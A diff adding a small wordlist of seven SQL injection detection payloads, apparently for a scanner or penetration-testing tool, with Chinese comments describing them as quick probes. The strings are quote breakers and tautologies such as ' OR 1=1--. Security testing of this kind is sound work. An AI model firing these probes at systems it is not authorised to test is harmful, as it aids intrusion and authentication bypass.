@@ -1,0 +1,11 @@
+# Quick SQL Injection Detection Payloads
+# 快速检测payload - 用于初步探测
+# 精选7个高效payload
+
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+1' AND '1'='1
+1' AND '1'='2
